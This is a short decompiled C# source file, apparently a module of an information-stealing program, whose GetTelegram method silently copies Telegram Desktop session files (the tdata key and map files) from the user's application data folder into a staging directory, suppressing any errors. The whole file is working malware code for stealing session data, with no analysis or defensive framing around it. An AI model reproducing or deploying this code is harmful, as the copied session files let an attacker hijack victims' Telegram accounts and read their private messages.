using System;
using System.IO;

namespace Strange.Modules
{
	// Token: 0x0200000B RID: 11
	internal class Telegram
	{
		// Token: 0x06000017 RID: 23 RVA: 0x000025D0 File Offset: 0x000007D0
		public static void GetTelegram(string path)
		{
			Directory.CreateDirectory(path + "\\Telegram");
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1", path + "\\Telegram\\D877F783D5D3EF8C1", true);
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0", path + "\\Telegram\\D877F783D5D3EF8C0", true);
			}
			catch
			{
			}
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\map1", path + "\\Telegram\\map1", true);
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\map0", path + "\\Telegram\\map0", true);
			}
			catch
			{
			}
		}
	}
}
